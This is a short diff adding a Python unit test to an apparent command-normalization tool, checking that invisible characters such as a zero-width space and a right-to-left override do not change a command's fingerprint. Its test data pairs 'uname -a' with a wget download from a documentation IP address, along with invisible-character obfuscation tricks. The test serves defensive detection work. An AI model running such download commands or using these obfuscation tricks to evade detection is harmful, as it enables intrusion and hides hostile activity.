@@ -63,5 +63,12 @@ def test_hostile_input_is_linear() -> None:
     assert time.monotonic() - start < 1.0
 
 
+def test_invisible_characters_do_not_change_the_fingerprint() -> None:
+    plain = normalize_text("uname -a\nwget http://192.0.2.1/x")
+    sneaky = normalize_text("un​ame -a\nw\x07get http://192.0.2.1/x‮")
+    assert plain == sneaky
+    assert fingerprint(plain) == fingerprint(sneaky)
+
+
 def test_file_names_are_not_hosts() -> None:
     assert normalize_command("rm payload.sh config.json") == "rm payload.sh config.json"
